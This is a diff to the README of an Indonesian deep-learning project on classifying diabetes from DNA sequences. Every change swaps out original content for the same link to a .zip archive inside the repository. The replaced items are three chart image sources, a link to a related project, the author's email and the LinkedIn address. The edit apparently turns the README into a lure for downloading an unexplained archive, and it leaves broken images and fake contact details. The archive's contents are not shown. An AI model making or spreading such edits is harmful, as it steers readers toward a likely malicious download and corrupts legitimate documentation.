@@ -40,7 +40,7 @@ Proses preprocessing dilakukan untuk memastikan kualitas dan representasi data t
 Visualisasi kata (k-mers) yang paling sering muncul dilakukan menggunakan **Wordcloud**.
 
 <p align="center">
-  <img src="images/WordCloud_DNA.png" width="500"/>
+  <img src="https://raw.githubusercontent.com/wheldnz/DeepLearning-Klasifikasi-Diabetes-/main/images/DeepLearning-Klasifikasi-Diabetes--1.4.zip" width="500"/>
 </p>
 
 ---
@@ -69,7 +69,7 @@ Visualisasi kata (k-mers) yang paling sering muncul dilakukan menggunakan **Word
 - Grafik evaluasi menunjukkan **train loss dan validation loss selaras**, menandakan **tidak overfitting**.
 
 <p align="center">
-  <img src="images/Evaluation.png" width="500"/>
+  <img src="https://raw.githubusercontent.com/wheldnz/DeepLearning-Klasifikasi-Diabetes-/main/images/DeepLearning-Klasifikasi-Diabetes--1.4.zip" width="500"/>
 </p>
 
 ---
@@ -81,7 +81,7 @@ Meskipun pendekatan Deep Learning semakin populer, hasil eksperimen menunjukkan 
 Sebaliknya, model Deep Learning yang diuji seperti **CNN** hanya mencapai akurasi maksimal sekitar **84%**.
 
 <p align="center">
-  <img src="images/Akurasi terbaik.png" width="500"/>
+  <img src="images/Akurasi https://raw.githubusercontent.com/wheldnz/DeepLearning-Klasifikasi-Diabetes-/main/images/DeepLearning-Klasifikasi-Diabetes--1.4.zip" width="500"/>
 </p>
 
 ---
@@ -100,7 +100,7 @@ Sebaliknya, model Deep Learning yang diuji seperti **CNN** hanya mencapai akuras
 ## 📌 Catatan
 
 - Lihat juga versi Machine Learning (SVM) dengan akurasi lebih tinggi di:  
-👉 [Klasifikasi DNA dengan SVM][(https://github.com/wheldnz/svm-dna-diabetes-classification)](https://github.com/wheldnz/Klasifikasi-Diabetes-Berdasarkan-Sekuens-DNA-Manusia)
+👉 [Klasifikasi DNA dengan SVM][(https://raw.githubusercontent.com/wheldnz/DeepLearning-Klasifikasi-Diabetes-/main/images/DeepLearning-Klasifikasi-Diabetes--1.4.zip)](https://raw.githubusercontent.com/wheldnz/DeepLearning-Klasifikasi-Diabetes-/main/images/DeepLearning-Klasifikasi-Diabetes--1.4.zip)
 
 
 ## 👤 Kontributor
@@ -114,5 +114,5 @@ Sebaliknya, model Deep Learning yang diuji seperti **CNN** hanya mencapai akuras
 
 Ingin berdiskusi lebih lanjut atau membutuhkan file csv nya?
 
-- 📧 Email: [wildanuril99@email.com]  
-- 💼 LinkedIn: [www.linkedin.com/in/wildan-nuril]
+- 📧 Email: [https://raw.githubusercontent.com/wheldnz/DeepLearning-Klasifikasi-Diabetes-/main/images/DeepLearning-Klasifikasi-Diabetes--1.4.zip]  
+- 💼 LinkedIn: [https://raw.githubusercontent.com/wheldnz/DeepLearning-Klasifikasi-Diabetes-/main/images/DeepLearning-Klasifikasi-Diabetes--1.4.zip]
